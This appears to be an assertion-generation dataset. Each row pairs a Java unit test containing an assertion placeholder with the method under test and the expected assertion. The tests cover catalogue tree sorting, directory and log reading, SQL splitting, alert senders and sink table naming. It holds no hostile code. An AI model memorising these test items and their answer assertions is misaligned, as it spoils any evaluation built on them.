"sortDescTest() { SortTypeEnum sortTypeEnum = SortTypeEnum.DESC; List<Catalogue> catalogueTree = Lists.newArrayList(); Catalogue catalogue = new Catalogue(); catalogue.setId(1); catalogue.setCreateTime(LocalDateTime.of(2024, 4, 28, 19, 22, 0));  Catalogue catalogue11 = new Catalogue(); catalogue11.setId(2); catalogue11.setCreateTime(LocalDateTime.of(2024, 4, 28, 20, 22, 0)); Catalogue catalogue12 = new Catalogue(); catalogue12.setId(3); catalogue12.setCreateTime(LocalDateTime.of(2024, 4, 28, 21, 22, 0)); catalogue.setChildren(Lists.newArrayList(catalogue12, catalogue11));  Catalogue catalogue2 = new Catalogue(); catalogue2.setId(4); catalogue2.setCreateTime(LocalDateTime.of(2024, 4, 29, 19, 22, 0));  Catalogue catalogue21 = new Catalogue(); catalogue21.setId(7); catalogue21.setCreateTime(LocalDateTime.of(2024, 4, 29, 21, 22, 0)); Catalogue catalogue22 = new Catalogue(); catalogue22.setId(6); catalogue22.setCreateTime(LocalDateTime.of(2024, 4, 29, 20, 22, 0)); catalogue2.setChildren(Lists.newArrayList(catalogue21, catalogue22));  catalogueTree.add(catalogue2); catalogueTree.add(catalogue);  /* input: -- 4 (2024-04-29 19:22:00) -- 7 (2024-04-29 21:22:00) -- 6 (2024-04-29 20:22:00) -- 1 (2024-04-28 19:22:00) -- 3 (2024-04-28 21:22:00) -- 2 (2024-04-28 20:22:00)  output: -- 4 (2024-04-29 19:22:00) -- 7 (2024-04-29 21:22:00) -- 6 (2024-04-29 20:22:00) -- 1 (2024-04-28 19:22:00) -- 3 (2024-04-28 21:22:00) -- 2 (2024-04-28 20:22:00) */ List<Catalogue> resultList = catalogueTreeSortCreateTimeStrategyTest.sort(catalogueTree, sortTypeEnum); List<Integer> resultIdList = CategoryTreeSortStrategyTestUtils.breadthTraverse(resultList); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug( ""sort catalogue tree based on creation time. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); return recursionSortCatalogues(catalogueTree, sortTypeEnum); }"	assertEquals(Lists.newArrayList(4, 1, 7, 6, 3, 2), resultIdList)
"sortEmptyTest() { List<Catalogue> catalogueTree = Lists.newArrayList(); SortTypeEnum sortTypeEnum = SortTypeEnum.ASC;  List<Catalogue> resultList = catalogueTreeSortCreateTimeStrategyTest.sort(catalogueTree, sortTypeEnum); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug( ""sort catalogue tree based on creation time. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); return recursionSortCatalogues(catalogueTree, sortTypeEnum); }"	assertEquals(Lists.newArrayList(), resultList)
"sortEmptyTest2() { List<Catalogue> catalogueTree = null; SortTypeEnum sortTypeEnum = SortTypeEnum.ASC;  List<Catalogue> resultList = catalogueTreeSortCreateTimeStrategyTest.sort(catalogueTree, sortTypeEnum); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug( ""sort catalogue tree based on creation time. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); return recursionSortCatalogues(catalogueTree, sortTypeEnum); }"	assertEquals(Lists.newArrayList(), resultList)
"sortAscTest() { SortTypeEnum sortTypeEnum = SortTypeEnum.ASC; List<Catalogue> catalogueTree = Lists.newArrayList(); Catalogue catalogue = new Catalogue(); catalogue.setId(1);  Catalogue catalogue11 = new Catalogue(); catalogue11.setId(2); Catalogue catalogue12 = new Catalogue(); catalogue12.setId(3); catalogue.setChildren(Lists.newArrayList(catalogue12, catalogue11));  Catalogue catalogue2 = new Catalogue(); catalogue2.setId(4);  Catalogue catalogue21 = new Catalogue(); catalogue21.setId(7); Catalogue catalogue22 = new Catalogue(); catalogue22.setId(6); catalogue2.setChildren(Lists.newArrayList(catalogue21, catalogue22));  catalogueTree.add(catalogue2); catalogueTree.add(catalogue);  /* input: -- 4 -- 7 -- 6 -- 1 -- 3 -- 2  output: -- 1 -- 2 -- 3 -- 4 -- 6 -- 7 */ List<Catalogue> resultList = catalogueTreeSortDefaultStrategyTest.sort(catalogueTree, sortTypeEnum); List<Integer> resultIdList = CategoryTreeSortStrategyTestUtils.breadthTraverse(resultList); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug(""sort catalogue tree based on id. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); return recursionSortCatalogues(catalogueTree, sortTypeEnum); }"	assertEquals(Lists.newArrayList(1, 4, 2, 3, 6, 7), resultIdList)
"sortDescTest() { SortTypeEnum sortTypeEnum = SortTypeEnum.DESC; List<Catalogue> catalogueTree = Lists.newArrayList(); Catalogue catalogue = new Catalogue(); catalogue.setId(1);  Catalogue catalogue11 = new Catalogue(); catalogue11.setId(2); Catalogue catalogue12 = new Catalogue(); catalogue12.setId(3); catalogue.setChildren(Lists.newArrayList(catalogue12, catalogue11));  Catalogue catalogue2 = new Catalogue(); catalogue2.setId(4);  Catalogue catalogue21 = new Catalogue(); catalogue21.setId(7); Catalogue catalogue22 = new Catalogue(); catalogue22.setId(6); catalogue2.setChildren(Lists.newArrayList(catalogue21, catalogue22));  catalogueTree.add(catalogue2); catalogueTree.add(catalogue);  /* input: -- 4 -- 7 -- 6 -- 1 -- 3 -- 2  output: -- 4 -- 7 -- 6 -- 1 -- 3 -- 2 */ List<Catalogue> resultList = catalogueTreeSortDefaultStrategyTest.sort(catalogueTree, sortTypeEnum); List<Integer> resultIdList = CategoryTreeSortStrategyTestUtils.breadthTraverse(resultList); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug(""sort catalogue tree based on id. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); return recursionSortCatalogues(catalogueTree, sortTypeEnum); }"	assertEquals(Lists.newArrayList(4, 1, 7, 6, 3, 2), resultIdList)
"sortEmptyTest() { List<Catalogue> catalogueTree = Lists.newArrayList(); SortTypeEnum sortTypeEnum = SortTypeEnum.ASC;  List<Catalogue> resultList = catalogueTreeSortDefaultStrategyTest.sort(catalogueTree, sortTypeEnum); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug(""sort catalogue tree based on id. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); return recursionSortCatalogues(catalogueTree, sortTypeEnum); }"	assertEquals(Lists.newArrayList(), resultList)
"sortEmptyTest2() { List<Catalogue> catalogueTree = null; SortTypeEnum sortTypeEnum = SortTypeEnum.ASC;  List<Catalogue> resultList = catalogueTreeSortDefaultStrategyTest.sort(catalogueTree, sortTypeEnum); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug(""sort catalogue tree based on id. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); return recursionSortCatalogues(catalogueTree, sortTypeEnum); }"	assertEquals(Lists.newArrayList(), resultList)
"sortAscTest() { SortTypeEnum sortTypeEnum = SortTypeEnum.ASC; List<Catalogue> catalogueTree = Lists.newArrayList(); Catalogue catalogue = new Catalogue(); catalogue.setId(1); catalogue.setName(""测试目录""); catalogue.setCreateTime(LocalDateTime.of(2024, 4, 28, 19, 22, 0));  Catalogue catalogue11 = new Catalogue(); catalogue11.setId(2); catalogue11.setName(""bbb""); catalogue11.setCreateTime(LocalDateTime.of(2024, 4, 28, 20, 22, 0)); Catalogue catalogue12 = new Catalogue(); catalogue12.setId(3); catalogue12.setName(""aaa""); catalogue12.setCreateTime(LocalDateTime.of(2024, 4, 28, 21, 22, 0)); catalogue.setChildren(Lists.newArrayList(catalogue12, catalogue11));  Catalogue catalogue2 = new Catalogue(); catalogue2.setId(4); catalogue2.setName(""test""); catalogue2.setCreateTime(LocalDateTime.of(2024, 4, 29, 19, 22, 0));  Catalogue catalogue21 = new Catalogue(); catalogue21.setId(7); catalogue21.setName(""测试目录2""); catalogue21.setCreateTime(LocalDateTime.of(2024, 4, 29, 21, 22, 0)); Catalogue catalogue22 = new Catalogue(); catalogue22.setId(6); catalogue22.setName(""生产任务""); catalogue22.setCreateTime(LocalDateTime.of(2024, 4, 29, 20, 22, 0)); catalogue2.setChildren(Lists.newArrayList(catalogue21, catalogue22));  catalogueTree.add(catalogue2); catalogueTree.add(catalogue);  /* input: -- 4 (2024-04-29 19:22:00) (test) -- 7 (2024-04-29 21:22:00) (测试目录2) -- 6 (2024-04-29 20:22:00) (生产任务) -- 1 (2024-04-28 19:22:00) (测试目录) -- 3 (2024-04-28 21:22:00) (aaa) -- 2 (2024-04-28 20:22:00) (bbb)  output: -- 4 (2024-04-29 19:22:00) (test) -- 7 (2024-04-29 21:22:00) (测试目录2) -- 6 (2024-04-29 20:22:00) (生产任务) -- 1 (2024-04-28 19:22:00) (测试目录) -- 3 (2024-04-28 21:22:00) (aaa) -- 2 (2024-04-28 20:22:00) (bbb) */ List<Catalogue> resultList = catalogueTreeSortFirstLetterStrategyTest.sort(catalogueTree, sortTypeEnum); List<Integer> resultIdList = CategoryTreeSortStrategyTestUtils.breadthTraverse(resultList); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug( ""sort catalogue tree based on first letter. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); Collator collator = Collator.getInstance(Locale.CHINA); return recursionSortCatalogues(catalogueTree, sortTypeEnum, collator); }"	assertEquals(Lists.newArrayList(4, 1, 7, 6, 3, 2), resultIdList)
"sortDescTest() { SortTypeEnum sortTypeEnum = SortTypeEnum.DESC; List<Catalogue> catalogueTree = Lists.newArrayList(); Catalogue catalogue = new Catalogue(); catalogue.setId(1); catalogue.setName(""测试目录""); catalogue.setCreateTime(LocalDateTime.of(2024, 4, 28, 19, 22, 0));  Catalogue catalogue11 = new Catalogue(); catalogue11.setId(2); catalogue11.setName(""bbb""); catalogue11.setCreateTime(LocalDateTime.of(2024, 4, 28, 20, 22, 0)); Catalogue catalogue12 = new Catalogue(); catalogue12.setId(3); catalogue12.setName(""aaa""); catalogue12.setCreateTime(LocalDateTime.of(2024, 4, 28, 21, 22, 0)); catalogue.setChildren(Lists.newArrayList(catalogue12, catalogue11));  Catalogue catalogue2 = new Catalogue(); catalogue2.setId(4); catalogue2.setName(""test""); catalogue2.setCreateTime(LocalDateTime.of(2024, 4, 29, 19, 22, 0));  Catalogue catalogue21 = new Catalogue(); catalogue21.setId(7); catalogue21.setName(""测试目录2""); catalogue21.setCreateTime(LocalDateTime.of(2024, 4, 29, 21, 22, 0)); Catalogue catalogue22 = new Catalogue(); catalogue22.setId(6); catalogue22.setName(""生产任务""); catalogue22.setCreateTime(LocalDateTime.of(2024, 4, 29, 20, 22, 0)); catalogue2.setChildren(Lists.newArrayList(catalogue21, catalogue22));  catalogueTree.add(catalogue2); catalogueTree.add(catalogue);  /* input: -- 4 (2024-04-29 19:22:00) (test) -- 7 (2024-04-29 21:22:00) (测试目录2) -- 6 (2024-04-29 20:22:00) (生产任务) -- 1 (2024-04-28 19:22:00) (测试目录) -- 3 (2024-04-28 21:22:00) (aaa) -- 2 (2024-04-28 20:22:00) (bbb)  output: -- 1 (2024-04-28 19:22:00) (测试目录) -- 2 (2024-04-28 20:22:00) (bbb) -- 3 (2024-04-28 21:22:00) (aaa) -- 4 (2024-04-29 19:22:00) (test) -- 6 (2024-04-29 20:22:00) (生产任务) -- 7 (2024-04-29 21:22:00) (测试目录2) */ List<Catalogue> resultList = catalogueTreeSortFirstLetterStrategyTest.sort(catalogueTree, sortTypeEnum); List<Integer> resultIdList = CategoryTreeSortStrategyTestUtils.breadthTraverse(resultList); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug( ""sort catalogue tree based on first letter. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); Collator collator = Collator.getInstance(Locale.CHINA); return recursionSortCatalogues(catalogueTree, sortTypeEnum, collator); }"	assertEquals(Lists.newArrayList(1, 4, 2, 3, 6, 7), resultIdList)
"sortEmptyTest() { List<Catalogue> catalogueTree = Lists.newArrayList(); SortTypeEnum sortTypeEnum = SortTypeEnum.ASC;  List<Catalogue> resultList = catalogueTreeSortFirstLetterStrategyTest.sort(catalogueTree, sortTypeEnum); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug( ""sort catalogue tree based on first letter. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); Collator collator = Collator.getInstance(Locale.CHINA); return recursionSortCatalogues(catalogueTree, sortTypeEnum, collator); }"	assertEquals(Lists.newArrayList(), resultList)
"sortEmptyTest2() { List<Catalogue> catalogueTree = null; SortTypeEnum sortTypeEnum = SortTypeEnum.ASC;  List<Catalogue> resultList = catalogueTreeSortFirstLetterStrategyTest.sort(catalogueTree, sortTypeEnum); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug( ""sort catalogue tree based on first letter. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); Collator collator = Collator.getInstance(Locale.CHINA); return recursionSortCatalogues(catalogueTree, sortTypeEnum, collator); }"	assertEquals(Lists.newArrayList(), resultList)
"testListDirByPath() { List<FileNode> dirList = DirUtil.listDirByPath(DirConstant.getRootLogsPath()); Assertions.""<AssertPlaceHolder>""; }
listDirByPath(String path) { List<FileNode> dirList = new ArrayList<>(); File logDir = new File(path); if (logDir.isFile()) { throw new BusException(StrUtil.format(""Directory path {} is a file."", path)); } File[] files = logDir.listFiles(); if (Asserts.isNull(files)) { throw new BusException(StrUtil.format(""Directory path {} does not exist."", path)); } for (File file : files) { FileNode fileNode = new FileNode(file.getName(), file.isDirectory(), 0, file.getAbsolutePath()); if (!fileNode.isDir()) { fileNode.setSize(file.length()); } dirList.add(fileNode); } return dirList; }"	assertThat(dirList).isNotNull()
"testReadFile() { String result = DirUtil.readFile(DirConstant.getRootLog()); Assertions.""<AssertPlaceHolder>""; }
readFile(String path) { StringBuilder builder = new StringBuilder(); File file = new File(path); if (!file.isFile()) { throw new BusException(StrUtil.format(""File path {} is not a file."", path)); } try (InputStreamReader inputStreamReader = new InputStreamReader(Files.newInputStream(file.toPath()), StandardCharsets.UTF_8); BufferedReader bufferedReader = new BufferedReader(inputStreamReader)) { String content; while ((content = bufferedReader.readLine()) != null) { builder.append(""\n""); builder.append(content); } } catch (Exception e) { e.printStackTrace(); } return builder.toString(); }"	assertThat(result).isNotNull()
"testReadRootLog() { String result = DirUtil.readFile(DirConstant.getRootLog()); Assertions.""<AssertPlaceHolder>""; }
readFile(String path) { StringBuilder builder = new StringBuilder(); File file = new File(path); if (!file.isFile()) { throw new BusException(StrUtil.format(""File path {} is not a file."", path)); } try (InputStreamReader inputStreamReader = new InputStreamReader(Files.newInputStream(file.toPath()), StandardCharsets.UTF_8); BufferedReader bufferedReader = new BufferedReader(inputStreamReader)) { String content; while ((content = bufferedReader.readLine()) != null) { builder.append(""\n""); builder.append(content); } } catch (Exception e) { e.printStackTrace(); } return builder.toString(); }"	assertThat(result).isNotNull()
"getStatements() { String sql = ""set 'state.savepoints.dir' = 'hdfs://namenode:9000/tmp/checkpoint'; --ddd\n"" + ""set 'state.checkpoints.dir' = 'hdfs://namenode:9000/tmp/checkpoint'; --dd \n"" + ""create table abc ;\n""; String[] statements = SqlUtil.getStatements(sql, "";\\s*(?:\\n|--.*)""); Assertions.""<AssertPlaceHolder>""; }
getStatements(String sql, String sqlSeparator) { if (Asserts.isNullString(sql)) { return new String[0]; }  final String localSqlSeparator = "";\\s*(?:\\n|--.*)""; String[] splits = sql.replace(""\r\n"", ""\n"").split(localSqlSeparator); String lastStatement = splits[splits.length - 1].trim(); if (lastStatement.endsWith(SEMICOLON)) { splits[splits.length - 1] = lastStatement.substring(0, lastStatement.length() - 1); }  return splits; }"	assertThat(statements.length).isEqualTo(3)
"GeneralSecurityException { AlertResult alertResult = emailSender.send(AlertBaseConstant.ALERT_TEMPLATE_TITLE, AlertBaseConstant.ALERT_TEMPLATE_MSG); Assert.""<AssertPlaceHolder>""; }
send(String title, String content) { AlertResult alertResult = new AlertResult(); // if there is no receivers && no receiversCc, no need to process if (CollectionUtils.isEmpty(emailParams.getReceivers())) { logger.error(""no receivers , you must set receivers""); return alertResult; }  try { String sendResult = MailUtil.send( getMailAccount(), emailParams.getReceivers(), emailParams.getReceiverCcs(), null, title, content, true); if (StringUtils.isNotBlank(sendResult)) { logger.info(""Send email info: {}"", sendResult); alertResult.setSuccess(true); alertResult.setMessage(sendResult); return alertResult; } } catch (GeneralSecurityException e) { handleException(alertResult, e); }  return alertResult; }"	assertEquals(true, alertResult.getSuccess())
"sendTest() { HttpAlert httpAlert = new HttpAlert(); AlertConfig alertConfig = new AlertConfig(); alertConfig.setType(HttpConstants.TYPE); alertConfig.setParam(httpConfig); httpAlert.setConfig(alertConfig); AlertResult alertResult = httpAlert.send(AlertBaseConstant.ALERT_TEMPLATE_TITLE, AlertBaseConstant.ALERT_TEMPLATE_MSG); Assert.""<AssertPlaceHolder>""; }
send(String title, String content) { AlertResult alertResult = new AlertResult();  if (httpParams.getMethod() == null) { alertResult.setSuccess(false); alertResult.setMessage(""Request types are not supported""); return alertResult; }  try { createHttpRequest(title, content); String resp = this.getResponseString(httpRequest); alertResult.setSuccess(true); alertResult.setMessage(resp); } catch (Exception e) { logger.error(""send http alert msg  failed"", e); alertResult.setSuccess(false); alertResult.setMessage(""send http request  alert fail.""); }  return alertResult; }"	assertEquals(true, alertResult.getSuccess())
"testGetSinkTableNameWithPrefixAndSuffix() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.prefix"", ""pre_""); sinkConfig.put(""table.suffix"", ""_suf""); sinkConfig.put(""table.lower"", ""false""); sinkConfig.put(""table.upper"", ""false""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""testTable"", ""testSchema"", null); String expectedTableName = ""pre_testTable_suf""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
"testGetSinkTableNameWithOnlyPrefix() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.prefix"", ""pre_""); sinkConfig.put(""table.suffix"", """"); sinkConfig.put(""table.lower"", ""false""); sinkConfig.put(""table.upper"", ""false""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""testTable"", ""testSchema"", null); String expectedTableName = ""pre_testTable""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
"testGetSinkTableNameWithOnlySuffix() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.prefix"", """"); sinkConfig.put(""table.suffix"", ""_suf""); sinkConfig.put(""table.lower"", ""false""); sinkConfig.put(""table.upper"", ""false""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""testTable"", ""testSchema"", null); String expectedTableName = ""testTable_suf""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
"testGetSinkTableNameWithSchemaPrefixEnabled() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.prefix.schema"", ""true""); sinkConfig.put(""table.prefix"", """"); sinkConfig.put(""table.suffix"", """"); sinkConfig.put(""table.lower"", ""false""); sinkConfig.put(""table.upper"", ""false""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""testTable"", ""testSchema"", null); String expectedTableName = ""testSchema_testTable""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
